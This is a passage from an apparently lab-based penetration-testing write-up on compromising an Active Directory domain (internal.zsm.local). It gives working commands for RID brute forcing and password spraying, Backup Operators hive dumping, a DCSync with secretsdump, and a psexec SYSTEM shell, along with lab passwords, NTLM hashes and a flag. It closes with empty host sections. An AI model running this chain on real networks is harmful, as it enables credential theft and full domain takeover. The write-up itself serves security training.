| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:ZPH-SVRCDC01.internal.zsm.local
| Not valid before: 2026-01-20T15:28:01
|_Not valid after:  2027-01-20T15:28:01
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
55104/tcp open  msrpc         Microsoft Windows RPC
55126/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ZPH-SVRCDC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-01T01:32:18
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 2s

Post-scan script results:
| clock-skew: 
|   2s: 
|     192.168.210.10
|     192.168.210.12
|_    192.168.210.16
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 4 IP addresses (4 hosts up) scanned in 738.07 seconds
```

Sprayed all credentials here, but this didn't work either. I'm assuming ZEPHYR-ZABBIX will be the entry point!

With the newly discovered credentials from SVR-MGMT as user "melissa" I was able to authenticate against this new domain "internal.zsm.local".

Started with enumerating users!

```
nxc smb 192.168.210.16 -u melissa -p 'WinterIsHere2022!' --rid-brute > newusers.txt
```

Formatted the output and stored it in an users.txt wordlist. 

```
grep "SidTypeUser" newusers.txt | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
```

Enumerated SMB Shares and found interesting permissions.

```
nxc smb 192.168.210.16 -u melissa -p 'WinterIsHere2022!' --shares                  
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [+] internal.zsm.local\melissa:WinterIsHere2022! 
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Enumerated shares
SMB         192.168.210.16  445    ZPH-SVRCDC01     Share           Permissions     Remark
SMB         192.168.210.16  445    ZPH-SVRCDC01     -----           -----------     ------
SMB         192.168.210.16  445    ZPH-SVRCDC01     ADMIN$          READ            Remote Admin
SMB         192.168.210.16  445    ZPH-SVRCDC01     C$              READ,WRITE      Default share
SMB         192.168.210.16  445    ZPH-SVRCDC01     IPC$            READ            Remote IPC
SMB         192.168.210.16  445    ZPH-SVRCDC01     NETLOGON        READ            Logon server share 
SMB         192.168.210.16  445    ZPH-SVRCDC01     SYSVOL          READ            Logon server share
```

Since we don't have write permissions to the admin SMB Share means we aren't part of the Administrators Group, but we have high permissions!

Since we couldn't authenticate. Let's download domain information.

```
rusthound-ce --domain internal.zsm.local -u melissa -p 'WinterIsHere2022!' -i 192.168.210.16
```

Uploaded domain information onto BloodHound. Our current user melissa seems to be the DA of internal.zsm.local.

Enumerated local users on the target server aswell.

```
nxc smb 192.168.210.16 -u melissa -p 'WinterIsHere2022!' --users
```

This revealed an password for the mssql service account.

```
mssql_svc:ToughPasswordToCrack123!
```

Marked user melissa as owned in BloodHound. Found out she is part of the Backup Operators Group and seems to be Domain Admin. Trying to dump SAM, LSASS or NTDS didn't work tho. I'm not sure why. Also we don't have an shell on the DC or any host.

Let's continue with password spraying all users and passwords.

```
nxc smb 192.168.210.16 -u users.txt -p passwords.txt --continue-on-success
```

I found out user Aron is using the same password as mssql_svc.

```
Aron:ToughPasswordToCrack123!
```

Marked him as owned in BloodHound, but wasn't able to find anything interesting. I decided to use an in-built utility of nxc to dump sam, system & security file remotely with backup operator.

```
nxc smb 192.168.210.16 -u melissa -p 'WinterIsHere2022!' -M backup_operator
```

This saved the SAM, SYSTEM & SECURITY File in the SYSVOL SMB Share. Navigated there and downloaded all of them.

```
smbclient \\\\192.168.210.16/SYSVOL -U melissa
mget SYSTEM
mget SAM
mget SECURITY
```

Dumped all local hashes.

```
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local
```

Since we couldn't authenticate with any of the provided credentials. Let's abuse an S4U2self Attack to get an Administrator.ccache ticket since we have the credentials of the machine account!

But this wasn't possible since I couldn't request an TGT. So I decided to mark the machine account as owned in BloodHound and checked his Privileges. He is part of the Domain Controllers Group which has GetChangesAll on the whole internal.zsm.local domain. Which means we can perform an DCSync attack using impacket-secretsdump remotely to dump all domain hashes.

```
impacket-secretsdump internal.zsm.local/'ZPH-SVRCDC01$'@192.168.210.16 -hashes :d47a6d90e1c5adf4200227514e393948
```

Retrieved Domain Admin Credentials.

```
Administrator:aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e
```

Connected to the Domain Controller via psexec & gained SYSTEM Shell.

```
impacket-psexec Administrator@192.168.210.16 -hashes aad3b435b51404eeaad3b435b51404ee:543beb20a2a579c7714ced68a1760d5e
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.210.16.....
[*] Found writable share ADMIN$
[*] Uploading file YYlInkSH.exe
[*] Opening SVCManager on 192.168.210.16.....
[*] Creating service CUvH on 192.168.210.16.....
[*] Starting service CUvH.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.3807]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved flag.txt in C:\Users\Administrator\Desktop.

```
ZEPHYR{In73rn4l_D0m41n_D0m1n473d}
```



```

```



```

```



```

```
---
## ZEPHYR-HR

192.168.210.17

```

```



```

```



```

```



```

```



```

```

---
## ZEPHYR-SRVRCSUP

192.168.210.18

```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```



```

```